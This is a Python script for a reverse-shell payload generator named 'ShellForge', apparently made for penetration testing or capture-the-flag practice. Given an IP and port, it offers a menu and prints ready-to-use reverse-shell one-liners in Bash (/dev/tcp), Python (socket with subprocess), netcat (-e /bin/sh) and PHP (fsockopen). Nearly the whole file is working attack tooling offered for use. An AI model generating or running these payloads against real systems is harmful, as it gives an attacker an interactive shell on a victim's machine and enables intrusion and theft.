from rich import print
from rich.console import Console
from rich.panel import Panel
from pyfiglet import Figlet
import sys


console = Console()


def show_banner():
    console = Console()

    # === Titel
    fig = Figlet(font="slant")
    banner = fig.renderText("ShellForge")

    console.print(f"[bold cyan]{banner}[/bold cyan]")

    # === ASCII logo
    ascii_logo = r"""
       /\
      |==|   Payload Generator
      |  |   ------------------
      |  |   Author: @Certifa
     /____\
    [======]
    |  💥  |   [~] Ready to forge shells
    '------'
    """
    console.print(ascii_logo, style="bold green")


show_banner()

# === Usage Panel
print(
    Panel.fit(
        "[bold white]Usage:[/bold white] python3 payloadgen.py [bold cyan]<IP> <PORT>[/bold cyan]\n\n"
        "[bold]Example:[/bold] python3 payloadgen.py 10.10.14.5 4444",
        title="[bold yellow]📘 How to use[/bold yellow]",
        border_style="blue",
    )
)

# === Argument check
if len(sys.argv) != 3:
    console.print(
        "[bold red]❌ Error:[/bold red] You must provide [cyan]<IP>[/cyan] and [cyan]<PORT>[/cyan]."
    )
    sys.exit(1)

ip = sys.argv[1]
port = sys.argv[2]

# === Menu
payloads = {
    "1": ("Bash TCP", f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"),
    "2": (
        "Python TCP",
        f'python3 -c \'import os,socket,subprocess;s=socket.socket();s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])\'',
    ),
    "3": ("Netcat (traditional)", f"nc {ip} {port} -e /bin/sh"),
    "4": (
        "PHP",
        f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    ),
    "5": ("Exit", None),
}

console.print("\n[bold magenta]Payload options:[/bold magenta]")
for key, val in payloads.items():
    console.print(f"[cyan]{key}.[/cyan] {val[0]}")

choice = console.input("\n[bold yellow]Enter your choice: [/bold yellow]").strip()

if choice not in payloads:
    console.print("[bold red]❌ Invalid option.[/bold red]")
    sys.exit(1)

if choice == "5":
    console.print("[bold yellow]👋 Exiting...[/bold yellow]")
    sys.exit(0)
# === Print payload
name, payload = payloads[choice]
console.print(f"\n[bold green]✅ Payload: {name}[/bold green]\n")
console.print(f"[italic white on black]{payload}[/italic white on black]\n")
